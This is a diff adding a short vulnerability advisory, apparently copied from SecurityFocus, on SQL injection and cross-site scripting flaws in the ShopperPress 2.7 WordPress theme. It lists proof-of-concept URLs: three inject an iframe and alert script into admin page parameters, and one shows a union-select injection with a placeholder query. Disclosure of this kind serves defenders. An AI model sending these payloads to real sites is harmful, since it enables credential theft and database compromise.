@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/55062/info
+
+The ShopperPress WordPress theme is prone to an SQL-injection and multiple cross-site vulnerabilities because it fails to properly sanitize user-supplied input.
+
+Successful exploits will allow an attacker to steal cookie-based authentication credentials, to compromise the application, to access or modify data, or to exploit latent vulnerabilities in the underlying database.
+
+ShopperPress 2.7 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/wp-admin/admin.php?page=images&p=0&search=%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fvuln-lab.com+width%3D800+height%3D800onload%3Dalert%28%22VLAB%22%29+%3C
+
+http://www.example.com/wp-admin/admin.php?page=emails&edit=%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fvuln-lab.com+width%3D800+height%3D800onload%3Dalert%28%22VLAB%22%29+%3C
+
+http://www.example.com/wp-admin/admin.php?page=members&edit&order=0%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fvuln-lab.com+width%3D800+height%3D800onload%3Dalert%28%22VLAB%22%29+%3C
+
+http://www.example.com/wp-admin/admin.php?page=orders&id=5-261343282-1%27union select[SQL-INJECTION!]-- 
